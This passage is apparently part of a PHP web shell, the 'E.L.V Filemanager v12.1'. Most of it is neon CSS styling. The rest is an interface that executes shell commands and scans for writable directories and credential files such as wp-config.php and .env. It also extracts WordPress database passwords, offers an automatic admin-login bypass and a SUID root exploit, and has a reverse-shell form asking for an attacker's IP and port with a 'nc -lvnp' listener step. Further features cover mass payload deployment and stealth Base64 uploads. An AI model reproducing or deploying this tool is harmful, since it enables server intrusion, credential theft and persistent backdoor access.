    right: -1px; bottom: -1px;
    border-radius: 8px;
    background: linear-gradient(
        45deg,
        var(--neon-cyan),
        var(--neon-magenta),
        var(--neon-yellow),
        var(--neon-green),
        var(--neon-cyan)
    );
    background-size: 400% 400%;
    z-index: -1;
    animation: border-disco 4s linear infinite;
    opacity: 0.5;
}

@keyframes border-disco {
    0%   { background-position: 0% 50%; }
    50%  { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
}

.glass-top-icons {
    display: flex;
    justify-content: space-evenly;
    align-items: center;
    width: 100%;
    gap: 12px;
    flex-wrap: wrap;
    position: relative;
    z-index: 2;
}

/* Navigasi Icon Button — efek jedag-jedug */
.glass-icon-btn {
    color: var(--neon-cyan);
    font-size: 48px;           /* Icon lebih besar */
    text-decoration: none;
    display: flex;
    flex-direction: column;
    align-items: center;
    transition: all 0.3s ease;
    filter: drop-shadow(0 0 10px rgba(0,240,255,0.3));
    animation: icon-glow-pulse 2s ease-in-out infinite;
}

.glass-icon-btn:nth-child(1) { animation-delay: 0s; }
.glass-icon-btn:nth-child(2) { animation-delay: 0.66s; }
.glass-icon-btn:nth-child(3) { animation-delay: 1.33s; }

@keyframes icon-glow-pulse {
    0%, 100% {
        filter: drop-shadow(0 0 8px var(--neon-cyan));
        color: var(--neon-cyan);
    }
    33% {
        filter: drop-shadow(0 0 15px var(--neon-magenta));
        color: var(--neon-magenta);
    }
    66% {
        filter: drop-shadow(0 0 15px var(--neon-yellow));
        color: var(--neon-yellow);
    }
}

.glass-icon-btn:hover {
    transform: scale(1.15);
    animation: none;
    filter: drop-shadow(0 0 25px var(--neon-cyan));
    color: #fff !important;
}

.label-txt {
    font-size: 12px;           /* Label diperbesar */
    font-weight: 700;
    margin-top: 8px;
    color: var(--text-secondary);
    letter-spacing: 1.5px;
    text-transform: uppercase;
}

/* Tombol ASCII Engine — disco border cycling */
.ascii-nav-btn {
    text-decoration: none;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 12px 24px;
    border: 2px solid var(--border-subtle);
    background: rgba(0,0,0,0.5);
    border-radius: 6px;
    cursor: pointer;
    transition: all 0.3s ease;
    position: relative;
    animation: ascii-border-disco 3s linear infinite;
}

@keyframes ascii-border-disco {
    0%   { border-color: var(--neon-cyan); box-shadow: 0 0 12px var(--neon-cyan); }
    25%  { border-color: var(--neon-magenta); box-shadow: 0 0 12px var(--neon-magenta); }
    50%  { border-color: var(--neon-yellow); box-shadow: 0 0 12px var(--neon-yellow); }
    75%  { border-color: var(--neon-green); box-shadow: 0 0 12px var(--neon-green); }
    100% { border-color: var(--neon-cyan); box-shadow: 0 0 12px var(--neon-cyan); }
}

.ascii-nav-btn:hover {
    transform: scale(1.06);
    background: rgba(0,0,0,0.7);
    animation: none;
    border-color: var(--neon-magenta) !important;
    box-shadow: 0 0 30px var(--neon-magenta) !important;
}

.ascii-nav-btn pre {
    margin: 0;
    font-size: 5.5px;          /* ASCII lebih besar */
    line-height: 1.15;
    font-weight: 700;
    color: var(--neon-cyan);
    text-shadow: 0 0 6px var(--neon-cyan);
}

.ascii-nav-btn div {
    font-size: 9px;
    font-weight: 700;
    letter-spacing: 3px;
    margin-top: 6px;
    color: var(--neon-magenta);
    text-shadow: 0 0 6px var(--neon-magenta);
}

/* ================================================================ */
/*  TOOLS INTERFACE                                                 */
/* ================================================================ */

.cyber-tools-interface {
    background: rgba(0,0,0,0.5);
    border: 1px solid var(--border-subtle);
    border-radius: 8px;
    padding: 24px;
    margin-bottom: 24px;
}

.tools-title {
    color: var(--neon-yellow);
    text-align: center;
    text-shadow: 0 0 12px var(--neon-yellow);
    letter-spacing: 3px;
    margin: 0 0 24px 0;
    font-size: 18px;           /* Judul tools diperbesar */
}

.tools-grid-cyber {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
    gap: 14px;
}

.cyber-tool-card {
    background: rgba(0,0,0,0.4);
    border: 1px solid var(--border-subtle);
    border-radius: 6px;
    padding: 18px;
    text-decoration: none;
    display: flex;
    flex-direction: column;
    align-items: center;
    text-align: center;
    transition: all 0.3s ease;
}

.cyber-tool-card:hover {
    border-color: var(--neon-cyan);
    box-shadow: var(--glow-cyan);
    transform: translateY(-3px);
    background: rgba(0,240,255,0.06);
}

.icon-tool {
    font-size: 28px;           /* Icon tools diperbesar */
    margin-bottom: 12px;
    color: var(--neon-cyan);
    text-shadow: 0 0 10px var(--neon-cyan);
}

.tool-text-gold-wrap {
    background: rgba(0,0,0,0.5);
    border: 1px solid rgba(255,234,0,0.2);
    width: 100%;
    padding: 10px;
    border-radius: 4px;
}

.tool-text-gold-wrap h3 {
    margin: 0 0 6px 0;
    font-size: 14px;           /* Judul tool card diperbesar */
    color: var(--neon-yellow);
    text-shadow: 0 0 6px var(--neon-yellow);
    border-bottom: 1px solid rgba(255,234,0,0.2);
    padding-bottom: 6px;
}

.tool-text-gold-wrap p {
    margin: 0;
    font-size: 12px;           /* Deskripsi tool lebih besar */
    color: var(--text-secondary);
}

/* ================================================================ */
/*  BREADCRUMB — Directory Path                                    */
/* ================================================================ */

.breadcrumb {
    display: flex;
    align-items: center;
    background: rgba(0,0,0,0.4);
    padding: 14px;
    margin-bottom: 18px;
    border-left: 4px solid var(--neon-cyan);
    overflow-x: auto;
    white-space: nowrap;
    border-radius: 4px;
    font-size: 15px;           /* Breadcrumb diperbesar */
}

.home-btn {
    color: var(--neon-cyan);
    margin-right: 12px;
    font-size: 24px;
    text-decoration: none;
    text-shadow: 0 0 8px var(--neon-cyan);
    transition: all 0.3s;
}

.home-btn:hover {
    color: var(--neon-magenta);
    text-shadow: 0 0 15px var(--neon-magenta);
}

.breadcrumb a {
    color: var(--text-primary);
    text-decoration: none;
    font-weight: 700;
    font-size: 15px;
    transition: color 0.2s;
}

.breadcrumb a:hover {
    color: var(--neon-cyan);
    text-shadow: 0 0 8px var(--neon-cyan);
}

.breadcrumb span {
    color: var(--text-dim);
    margin: 0 10px;
    font-size: 15px;
}

/* ================================================================ */
/*  TOOLS ROW (Upload, MK File, MK Dir)                            */
/* ================================================================ */

.tools {
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 12px;
    margin-bottom: 18px;
}

.neon-cyan-box {
    border: 1px solid var(--border-subtle);
    background: rgba(0,0,0,0.3);
    border-radius: 6px;
    padding: 14px;
    display: flex;
    flex-direction: column;
    justify-content: center;
    transition: border-color 0.3s;
}

.neon-cyan-box:hover {
    border-color: var(--neon-cyan);
    box-shadow: var(--glow-cyan);
}

/* ================================================================ */
/*  BUTTONS                                                         */
/* ================================================================ */

.btn-cyan-glow {
    background: transparent;
    border: 2px solid var(--neon-cyan);
    color: var(--neon-cyan);
    font-weight: 700;
    box-shadow: 0 0 10px rgba(0,240,255,0.1);
    text-shadow: 0 0 6px var(--neon-cyan);
    transition: all 0.3s ease;
    cursor: pointer;
    border-radius: 4px;
    font-family: inherit;
    text-transform: uppercase;
    font-size: 12px;           /* Tombol lebih besar */
    padding: 12px 18px;
}

.btn-cyan-glow:hover {
    background: rgba(0,240,255,0.1);
    border-color: var(--neon-magenta);
    box-shadow: 0 0 25px var(--neon-cyan), inset 0 0 12px rgba(0,240,255,0.08);
    color: #fff;
}

.btn-gray {
    background: transparent;
    color: var(--text-secondary);
    border: 1px solid var(--border-subtle);
    font-weight: 700;
    border-radius: 3px;
    cursor: pointer;
    padding: 6px 10px;
    font-size: 11px;
    font-family: inherit;
    transition: all 0.2s;
}

.btn-gray:hover {
    border-color: var(--neon-cyan);
    color: var(--neon-cyan);
}

.btn-act-small {
    background: transparent;
    border: none;
    color: var(--text-secondary);
    cursor: pointer;
    padding: 5px;
    font-size: 15px;           /* Icon action lebih besar */
    transition: 0.2s;
    margin: 0 4px;
}

.btn-act-small:hover {
    transform: scale(1.2);
}

.act-dl:hover { color: var(--neon-cyan); text-shadow: 0 0 10px var(--neon-cyan); }
.act-cp:hover { color: var(--neon-green); text-shadow: 0 0 10px var(--neon-green); }
.act-del:hover { color: var(--neon-red); text-shadow: 0 0 10px var(--neon-red); }

.btn-editor-save {
    border: 2px solid var(--neon-green);
    color: var(--neon-green);
    background: transparent;
    padding: 12px 24px;
    font-weight: 700;
    border-radius: 4px;
    cursor: pointer;
    font-family: inherit;
    font-size: 14px;
    text-transform: uppercase;
    transition: all 0.3s;
}

.btn-editor-save:hover {
    background: rgba(0,255,136,0.1);
    box-shadow: 0 0 25px rgba(0,255,136,0.25);
}

.btn-editor-cancel {
    border: 2px solid var(--neon-red);
    color: var(--neon-red);
    background: transparent;
    padding: 12px 24px;
    font-weight: 700;
    border-radius: 4px;
    cursor: pointer;
    font-family: inherit;
    font-size: 14px;
    text-transform: uppercase;
    transition: all 0.3s;
    text-decoration: none;
    text-align: center;
}

.btn-editor-cancel:hover {
    background: rgba(255,0,60,0.1);
    box-shadow: 0 0 25px rgba(255,0,60,0.25);
}

/* ================================================================ */
/*  FORM INPUTS                                                     */
/* ================================================================ */

input[type="file"] {
    background: rgba(0,0,0,0.4);
    border: 1px dashed var(--border-subtle);
    color: var(--text-primary);
    padding: 8px;
    width: 100%;
    border-radius: 4px;
    cursor: pointer;
    font-family: inherit;
    font-size: 12px;
    outline: none;
}

input[type="file"]::file-selector-button {
    background: rgba(0,0,0,0.6);
    border: 1px solid var(--border-subtle);
    color: var(--neon-cyan);
    padding: 6px 10px;
    border-radius: 3px;
    margin-right: 8px;
    cursor: pointer;
    font-size: 11px;
    transition: all 0.2s;
}

input[type="file"]::file-selector-button:hover {
    border-color: var(--neon-cyan);
}

input[type="text"],
input[type="number"],
textarea,
select {
    background: rgba(0,0,0,0.5);
    border: 1px solid var(--border-subtle);
    color: var(--text-primary);
    padding: 12px;             /* Input lebih besar */
    width: 100%;
    outline: none;
    border-radius: 4px;
    font-size: 14px;           /* Teks input lebih besar */
    font-family: inherit;
    transition: border-color 0.3s, box-shadow 0.3s;
}

input[type="text"]:focus,
input[type="number"]:focus,
textarea:focus,
select:focus {
    border-color: var(--neon-cyan);
    box-shadow: 0 0 15px rgba(0,240,255,0.15);
}

/* CHMOD Input — Warna Hijau Gapunya Write Permission */
input[name="c_perm"] {
    background: transparent;
    border: none;
    color: var(--neon-red);    /* Default merah */
    font-weight: 700;
    font-size: 14px;
    padding: 2px;
    width: 45px;
    text-align: center;
}

/* ================================================================ */
/*  FILE TABLE — dengan pembeda WRITEABLE / NON-WRITEABLE          */
/* ================================================================ */

.table-responsive {
    width: 100%;
    overflow-x: auto;
    background: rgba(0,0,0,0.3);
    border: 1px solid var(--border-subtle);
    border-radius: 5px;
}

table {
    width: 100%;
    border-collapse: collapse;
    min-width: 650px;
    font-size: 14px;           /* Teks tabel diperbesar */
}

th {
    text-align: left;
    background: rgba(0,0,0,0.7);
    color: var(--neon-yellow);
    padding: 14px 18px;
    font-size: 13px;
    text-transform: uppercase;
    letter-spacing: 1.5px;
    border-bottom: 2px solid var(--border-subtle);
    font-weight: 700;
    text-shadow: 0 0 6px var(--neon-yellow);
}

td {
    padding: 12px 18px;
    border-bottom: 1px solid rgba(255,255,255,0.03);
    vertical-align: middle;
    color: var(--text-primary);
}

/* ================================================================ */
/*  ★★★ FILE LIST — WRITEABLE / NON-WRITEABLE HIJAU/MERAH ★★★     */
/* ================================================================ */

.item-t { 
    text-decoration: none; 
    font-weight: 700; 
    font-size: 14px;           /* Nama file diperbesar */
    transition: color 0.2s, text-shadow 0.2s;
}

/* Secara default pakai warna berdasarkan writeable — di-set inline dari PHP */
.item-t[data-writable="1"] { 
    color: var(--neon-green) !important; 
    text-shadow: 0 0 8px rgba(0,255,136,0.4);
}
.item-t[data-writable="0"] { 
    color: var(--neon-red) !important; 
    text-shadow: 0 0 8px rgba(255,0,60,0.4);
}

.item-t:hover {
    color: var(--neon-cyan) !important;
    text-shadow: 0 0 12px var(--neon-cyan);
}

/* Label [D] dan [F] */
.dir-label {
    font-weight: 700;
    margin-right: 6px;
}

.dir-label[data-type="dir"] { 
    color: var(--neon-magenta); 
    text-shadow: 0 0 6px var(--neon-magenta);
}
.dir-label[data-type="file"] { 
    color: var(--neon-cyan); 
    text-shadow: 0 0 6px var(--neon-cyan);
}

/* CHMOD color — hijau jika writable, merah jika tidak */
.chmod-writable {
    color: var(--neon-green) !important;
    text-shadow: 0 0 6px var(--neon-green);
}
.chmod-nonwritable {
    color: var(--neon-red) !important;
    text-shadow: 0 0 6px var(--neon-red);
}

/* Size column */
.col-size { 
    width: 110px; 
    color: var(--text-secondary); 
    font-size: 13px;
}
.col-chmod { 
    width: 100px; 
    font-size: 13px;
}
.col-act { 
    text-align: right; 
    width: 200px; 
    white-space: nowrap; 
}

/* ================================================================ */
/*  CONSOLE / TERMINAL OUTPUT                                       */
/* ================================================================ */

.console {
    background: rgba(0,0,0,0.7);
    color: var(--neon-yellow);
    padding: 18px;
    border: 1px solid var(--border-subtle);
    font-size: 14px;           /* Teks console diperbesar */
    min-height: 140px;
    overflow-y: auto;
    margin-bottom: 12px;
    border-top: 3px solid var(--neon-magenta);
    white-space: pre-wrap;
    border-radius: 4px;
    font-family: inherit;
    text-shadow: 0 0 5px var(--neon-yellow), 0 -1px 3px var(--neon-orange);
}

.console pre {
    color: var(--neon-yellow);
    margin: 0;
    font-size: 14px;           /* Output console lebih besar */
}

/* Terminal Box (dedicated terminal mode) */
.cyber-term-box {
    background: rgba(0,0,0,0.5);
    border: 1px solid var(--border-subtle);
    border-radius: 6px;
    padding: 24px;
    display: flex;
    flex-direction: column;
}

.cyber-input-wrapper {
    display: flex;
    align-items: center;
    background: rgba(0,0,0,0.5);
    border-left: 4px solid var(--neon-cyan);
    padding: 16px;
    margin-bottom: 16px;
    transition: border-color 0.3s;
}

.cyber-input-wrapper:focus-within {
    border-left-color: var(--neon-magenta);
}

.cyber-cmd-prompt {
    color: var(--neon-cyan);
    font-weight: 700;
    margin-right: 16px;
    text-shadow: 0 0 6px var(--neon-cyan);
    font-size: 16px;
    white-space: nowrap;
}

.cyber-cmd-input {
    background: transparent !important;
    border: none !important;
    color: var(--text-primary) !important;
    width: 100%;
    font-family: inherit;
    font-size: 16px !important;
    outline: none;
    padding: 0 !important;
}

.cyber-cmd-input::placeholder {
    color: rgba(224, 224, 255, 0.2);
}

.cyber-exec-btn {
    background: transparent;
    border: 2px solid var(--neon-cyan);
    color: var(--neon-cyan);
    padding: 16px;
    width: 100%;
    font-family: inherit;
    font-weight: 700;
    font-size: 15px;
    text-transform: uppercase;
    letter-spacing: 4px;
    cursor: pointer;
    transition: all 0.3s;
    text-shadow: 0 0 6px var(--neon-cyan);
}

.cyber-exec-btn:hover {
    background: rgba(0,240,255,0.06);
    color: #fff;
    border-color: var(--neon-magenta);
    box-shadow: 0 0 25px var(--neon-cyan);
}

/* ================================================================ */
/*  CODEMIRROR EDITOR                                               */
/* ================================================================ */

.CodeMirror {
    height: auto;
    min-height: 500px;
    font-size: 14px;           /* Code editor lebih besar */
    border-radius: 4px;
    border: 1px solid var(--border-subtle);
    font-family: 'Share Tech Mono', monospace !important;
}

/* ================================================================ */
/*  FOOTER                                                          */
/* ================================================================ */

.glow-static {
    text-align: center;
    margin-top: 36px;
    padding-bottom: 24px;
    color: var(--text-dim);
    font-size: 12px;
}

/* ================================================================ */
/*  TOOL CARD BORDER WARNA SPESIFIK                                 */
/* ================================================================ */

.card-autoroot { border-color: var(--neon-cyan) !important; }
.card-recon { border-color: var(--neon-blue) !important; }
.card-wpadmin { border-color: var(--neon-green) !important; }
.card-revshell { border-color: var(--neon-red) !important; }
.card-mass { border-color: var(--neon-magenta) !important; }
.card-bypass406 { border-color: var(--neon-yellow) !important; }

/* ================================================================ */
/*  RESPONSIVE                                                      */
/* ================================================================ */

@media (max-width: 600px) {
    .hud-grid { grid-template-columns: repeat(2, 1fr); }
    .tools { grid-template-columns: 1fr; }
    .brand pre { font-size: 3.5px; }
    .container { padding: 12px; }
    .header { flex-wrap: wrap; gap: 12px; }
    .glass-icon-btn { font-size: 36px; }
    .ascii-nav-btn { padding: 8px 14px; }
    .ascii-nav-btn pre { font-size: 3.5px; }
}

@media (min-width: 768px) { 
    .hud-grid { grid-template-columns: repeat(4, 1fr); } 
    .tools { grid-template-columns: repeat(3, 1fr); } 
}
@media (min-width: 768px) { 
    .hud-grid { grid-template-columns: repeat(4, 1fr); } 
    .tools { grid-template-columns: repeat(3, 1fr); } 
}?>
</style>
</head>
<body>
<canvas id="terminal-bg"></canvas>
<div class="scanline">
</div>
<div class="container">
    <div class="header">
        <div class="header-brand"> 
            <img src="<?= $logo_inner ?>" class="logo">
            <div class="brand">
<pre>
███████╗██╗    ██╗   ██╗    ███████╗███╗   ███╗    ██╗   ██╗ ██╗██████╗     ██████╗ 
██╔════╝██║    ██║   ██║    ██╔════╝████╗ ████║    ██║   ██║███║╚════██╗   ██╔═████╗
█████╗  ██║    ██║   ██║    █████╗  ██╔████╔██║    ██║   ██║╚██║ █████╔╝   ██║██╔██║
██╔══╝  ██║    ╚██╗ ██╔╝    ██╔══╝  ██║╚██╔╝██║    ╚██╗ ██╔╝ ██║ ╚═══██╗   ████╔╝██║
███████╗███████╗╚████╔╝     ██║██╗  ██║ ╚═╝ ██║     ╚████╔╝  ██║██████╔╝██╗╚██████╔╝
╚══════╝╚══════╝ ╚═══╝      ╚═╝╚═╝  ╚═╝     ╚═╝      ╚═══╝   ╚═╝╚═════╝ ╚═╝ ╚═════╝ ▌</pre>
                <small>E.L.V © Filemanager v12.1 2026 ® // HxN</small>
            </div>
        </div>
        <a href="?logout=1" class="btn-logout-top">LOGOUT [X]</a>
    </div>
    
    <div class="hud-grid">
        <div class="hud-item"><b>[USER]</b><?= htmlspecialchars($u_info) ?></div>
        <div class="hud-item"><b>[SERVER]</b><?= htmlspecialchars(substr($s_soft, 0, 25)) ?></div>
        <div class="hud-item"><b>[IP ADDR]</b><?= htmlspecialchars($s_ip) ?></div>
        <div class="hud-item"><b>[PHP VER]</b><?= htmlspecialchars($php_v) ?></div>
        <div class="hud-item"><b>[KERNEL]</b><?= htmlspecialchars(substr($kernel, 0, 25)) ?></div>
        <div class="hud-item"><b>[UUID]</b><?= htmlspecialchars($uuid) ?></div>
        <div class="hud-item"><b>[DOC ROOT]</b><?= htmlspecialchars(substr($_SERVER['DOCUMENT_ROOT'], 0, 30)) ?></div>
        <div class="hud-item"><b>[DISABLED]</b><?= htmlspecialchars(substr($dis_func,0,20)) ?></div>
    </div>
    
    <?php if($status_msg): ?><div class="alert"><?= $status_msg ?></div><?php endif; ?>
    
    <div class="elv-neon-panel">
        <div class="glass-top-icons">
            <a href="?d=<?= urlencode($dir) ?>" class="glass-icon-btn" title="FILESYSTEM">
                <i class="fa-regular fa-folder-open"></i>
                <span class="label-txt">FILE</span>
            </a>
            <a href="?d=<?= urlencode($dir) ?>&mode=elv_tools" class="ascii-nav-btn" title="E.L.V ENGINE TOOLS">
<pre>
███████╗ ██╗      ██╗  ██╗
██╔════╝ ██║      ██║  ██║
█████╗   ██║      ██║  ██║
██╔══╝   ██║      ╚██╗██╔╝
███████╗ ███████╗  ╚███╔╝ 
╚══════╝ ╚══════╝   ╚══╝</pre>
                <div>[ ENGINE ]</div>
            </a>
            <a href="?d=<?= urlencode($dir) ?>&mode=terminal" class="glass-icon-btn" title="TERMINAL">
                <i class="fa-solid fa-terminal"></i>
                <span class="label-txt">TERMINAL</span>
            </a>
        </div>
    </div>
    
    <?php 
    if(@$_GET['mode'] == 'elv_tools') { ?>
        <div class="cyber-tools-interface">
            <h2 class="tools-title">[ E.L.V ENGINE ® v12.1 ]</h2>
            <div class="tools-grid-cyber">
                <a href="?d=<?= urlencode($dir) ?>&autoroot=1" class="cyber-tool-card card-autoroot">
                    <i class="fa-solid fa-bolt icon-tool"></i>
                    <div class="tool-text-gold-wrap">
                        <h3>AUTO ROOT EXPLOIT</h3>
                        <p>Automated SUID privilege escalation scan.</p>
                    </div>
                </a>
                <a href="?d=<?= urlencode($dir) ?>&semiauto=1" class="cyber-tool-card card-recon">
                    <i class="fa-solid fa-radar icon-tool"></i>
                    <div class="tool-text-gold-wrap">
                        <h3>SEMI AUTO RECON</h3>
                        <p>Writable dirs & sensitive file scanner.</p>
                    </div>
                </a>
                <a href="?d=<?= urlencode($dir) ?>&wpbypass=1" class="cyber-tool-card card-wpadmin">
                    <i class="fa-brands fa-wordpress icon-tool"></i>
                    <div class="tool-text-gold-wrap">
                        <h3>WP ADMIN BYPASS</h3>
                        <p>Direct access to WordPress Dashboard.</p>
                    </div>
                </a>
                <a href="?d=<?= urlencode($dir) ?>&revshell=1" class="cyber-tool-card card-revshell">
                    <i class="fa-solid fa-network-wired icon-tool"></i>
                    <div class="tool-text-gold-wrap">
                        <h3>REVERSE SHELL</h3>
                        <p>Tactical backdoor connection to listener.</p>
                    </div>
                </a>
                <a href="?d=<?= urlencode($dir) ?>&mode=mass" class="cyber-tool-card card-mass">
                    <i class="fa-solid fa-truck-fast icon-tool"></i>
                    <div class="tool-text-gold-wrap">
                        <h3>MASS DEPLOYMENT</h3>
                        <p>Deploy payload across multiple target sectors.</p>
                    </div>
                </a>
                <a href="?d=<?= urlencode($dir) ?>&mode=bypass406" class="cyber-tool-card card-bypass406">
                    <i class="fa-solid fa-truck-ramp-box icon-tool"></i>
                    <div class="tool-text-gold-wrap">
                        <h3>406 BYPASS UPLOAD</h3>
                        <p>Stealth Base64 writer & Remote Grabber.</p>
                    </div>
                </a>
            </div>
        </div>
    <?php }
    elseif(@$_GET['mode'] == 'terminal') { ?>
        <div class="cyber-tools-interface">
            <h2 class="tools-title">[ TACTICAL SYSTEM TERMINAL ]</h2>
            <div class="cyber-term-box">
                <form method="post" action="?d=<?= urlencode($dir) ?>&mode=terminal" style="display:flex; flex-direction:column; flex-grow:1;">
                    <div class="cyber-input-wrapper">
                        <span class="cyber-cmd-prompt">noname@elv:~#</span>
                        <input type="text" name="cmd" class="cyber-cmd-input" placeholder="_type_command_here..." autofocus autocomplete="off">
                    </div>
                    <button type="submit" class="cyber-exec-btn">EXECUTE COMMAND</button>
                </form>
                <?php if ($out || isset($_POST['cmd'])): ?>
                    <div class="console" style="margin-top:20px; max-height:400px; overflow-y:auto;">
                        <pre><?= htmlspecialchars($out) ?></pre>
                    </div>
                <?php endif; ?>
            </div>
        </div>
    <?php }
     elseif(isset($_GET['autoroot']) && $_GET['autoroot'] == '1'){ ?>
        <div style="border:1px solid var(--cyan); text-align:center; padding:20px; background:rgba(0,0,0,0.5); border-radius:4px;">
            <h3 style="color:var(--cyan); margin-top:0; text-shadow:0 0 8px var(--cyan);">EXECUTE AUTOMATED ROOT SCAN & EXPLOIT?</h3>
            <div style="display:flex; justify-content:center; gap:15px; margin-top:15px;">
                <a href="?d=<?= urlencode($dir) ?>&autoroot=exec" style="color:var(--green); font-weight:700; padding:10px 25px; border:1px solid var(--green); text-decoration:none; border-radius:3px; transition:all 0.3s;">YES</a>
                <a href="?d=<?= urlencode($dir) ?>" style="color:var(--red); font-weight:700; padding:10px 25px; border:1px solid var(--red); text-decoration:none; border-radius:3px; transition:all 0.3s;">NO</a>
            </div>
        </div>
    <?php }
    elseif(isset($_GET['semiauto'])) { ?>
        <div class="console" style="border-top-color:var(--green);">
            <h3 style="color:var(--green); margin-top:0; text-align:center; text-shadow:0 0 8px var(--green);">[ SEMI-AUTO RECON & JUMP ]</h3>
            <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap:15px; margin-top:15px;">
                <div style="border:1px dashed var(--green); padding:10px; background:rgba(0,0,0,0.4); border-radius:3px;">
                    <b style="color:var(--green); display:block; margin-bottom:10px; text-align:center;">[ WRITABLE DIRECTORIES ]</b>
                    <?php
                    $scan_targets = ['/tmp' => 'TMP DIR', '/var/tmp' => 'VAR TMP', '/dev/shm' => 'DEV SHM', $dir => 'CURRENT DIR', $_SERVER['DOCUMENT_ROOT'] => 'DOC ROOT'];
                    $found_dir = false;
                    foreach($scan_targets as $path => $label) {
                        if(@is_writable($path)) { 
                            $found_dir = true;
                            echo '<a href="?d='.urlencode($path).'" style="display:block; border:1px solid var(--green); color:var(--green); text-decoration:none; padding:8px; text-align:center; margin-bottom:5px; border-radius:3px; transition:all 0.2s;">JUMP &rarr; '.$label.'</a>'; 
                        }
                    }
                    if(!$found_dir) echo "<div style='text-align:center; color:var(--steel);'>NO WRITABLE DIR FOUND</div>";
                    ?>
                </div>
                <div style="border:1px dashed var(--magenta); padding:10px; background:rgba(0,0,0,0.4); border-radius:3px;">
                    <b style="color:var(--magenta); display:block; margin-bottom:10px; text-align:center;">[ TARGET SENSITIVE FILES ]</b>
                    <?php
                    $interesting_files = ['wp-config.php', 'configuration.php', '.env', 'config.php', 'database.php'];
                    $found_file = false;
                    foreach([$dir, dirname($dir), $_SERVER['DOCUMENT_ROOT']] as $base_scan) {
                        foreach($interesting_files as $ifile) {
                            $full_path = $base_scan . '/' . $ifile;
                            if(@file_exists($full_path) && @is_readable($full_path)) { 
                                $found_file = true;
                                echo '<a href="?edit='.urlencode($full_path).'&d='.urlencode($dir).'" style="display:block; border:1px solid var(--magenta); color:var(--magenta); text-decoration:none; padding:8px; text-align:center; margin-bottom:5px; border-radius:3px; transition:all 0.2s;">EDIT &rarr; '.$ifile.'</a>'; 
                            }
                        }
                    }
                    if(!$found_file) echo "<div style='text-align:center; color:var(--steel);'>NO SENSITIVE FILES FOUND</div>";
                    ?>
                </div>
            </div>
        </div>
    <?php } 
    elseif(isset($_GET['revshell'])) { ?>
        <div class="console" style="border-top-color:var(--red);">
            <h3 style="color:var(--red); margin-top:0; text-align:center; text-shadow:0 0 8px var(--red);">[ TACTICAL REVERSE SHELL ]</h3>
            <form method="post" style="display:flex; flex-direction:column; gap:10px; margin-top:15px;">
                <div style="display:flex; gap:10px;">
                    <input type="text" name="rev_ip" placeholder="LHOST / IP ATTACKER" required style="flex:2;">
                    <input type="number" name="rev_port" placeholder="LPORT" required style="flex:1;">
                </div>
                <button type="submit" name="launch_rev" style="color:var(--red); width:100%; font-weight:700; letter-spacing:2px; font-size:14px; padding:15px; border:1px solid var(--red); background:transparent; cursor:pointer; border-radius:3px; transition:all 0.3s;">[ INITIATE CONNECTION ]</button>
            </form>
            <div style="margin-top:15px; font-size:11px; color:var(--steel); border:1px dashed var(--red); padding:10px; border-radius:3px;">
                <span style="color:var(--red); font-weight:bold;">[!] HOW TO USE:</span><br>
                1. Buka listener di terminal lu: <code style="color:var(--cyan);">nc -lvnp [PORT]</code><br>
                2. Masukkan IP dan Port lu di atas, klik Initiate.<br>
                3. Payload dieksekusi di background (Bash TCP Fork), web shell tidak akan hang.
            </div>
        </div>
    <?php } 
    elseif (isset($_GET['wpbypass'])) {
        $conf = $dir.'/wp-config.php';
        if(file_exists($conf)) {
            $get_conf = @file_get_contents($conf);
            preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $get_conf, $db);
            preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $get_conf, $user);
            preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $get_conf, $pass);
            preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $get_conf, $host);
            ?>
            <div class="console" style="border-top:2px solid var(--cyan);">
<pre>
[[ E.L.V WP-BYPASS ENGINE ]]
------------------------------------------
STATUS      : [ TARGET ACQUIRED ]
DB_NAME     : <?= htmlspecialchars(isset($db[1]) ? $db[1] : 'NOT_FOUND') ?>
DB_USER     : <?= htmlspecialchars(isset($user[1]) ? $user[1] : 'NOT_FOUND') ?>
DB_PASS     : <?= htmlspecialchars(isset($pass[1]) ? $pass[1] : 'NOT_FOUND') ?>
DB_HOST     : <?= htmlspecialchars(isset($host[1]) ? $host[1] : 'NOT_FOUND') ?>
------------------------------------------
[+] CONNECTION : STABLE
[+] SQL INJECT : ARMED
[+] BYPASS     : READY
------------------------------------------</pre>
<a href="?d=<?= urlencode($dir) ?>&action=wp_bypass" style="color:var(--cyan); border:1px solid var(--cyan); background:transparent; width:100%; text-decoration:none; text-align:center; display:block; padding:15px; font-size:14px; font-weight:700; border-radius:3px; transition:all 0.3s;">[ LAUNCH EXPLOIT: AUTO LOGIN ADMIN ]</a>
            </div>
            <?php
        } else { echo '<div class="alert" style="border-color:var(--red); color:var(--red);">[-] ERROR: wp-config.php NOT DETECTED IN THIS SECTOR.</div>'; }
    }
    elseif($out || (isset($_GET['autoroot']) && $_GET['autoroot'] == 'exec')){ ?>
        <div class="console">
            <pre><?= htmlspecialchars($out) ?></pre>
        </div>
    <?php } ?>

    <div class="breadcrumb">
        <a href="?d=<?= urlencode($base_shell) ?>" class="home-btn"><i class="fa-solid fa-house-crack"></i></a>
        <?php $ps = explode(DIRECTORY_SEPARATOR, $dir); $ac = ""; foreach ($ps as $id => $p) { if ($p == "" && $id == 0) { echo '<a href="?d=/" style="color:var(--cyan); text-decoration:none;">/</a>'; continue; } if ($p == "") continue; $ac .= DIRECTORY_SEPARATOR . $p; echo '<span style="color:var(--steel); margin:0 8px;">/</span><a href="?d='.urlencode($ac).'" style="color:var(--lavender); text-decoration:none; font-weight:700; font-size:13px;">'.$p.'</a>'; } ?>
    </div>
    
    <?php 
    if (isset($_GET['edit'])){
        $edit_file = $_GET['edit']; 
        if (file_exists($edit_file) && is_file($edit_file) && is_readable($edit_file)) {
            $f_content = htmlspecialchars(file_get_contents($edit_file));
            ?>
            <div class="console" style="border-top-color:var(--cyan);">
                <h3 style="color:var(--cyan); text-shadow:0 0 8px var(--cyan);">[ EDITING ] <?= basename($edit_file) ?></h3>
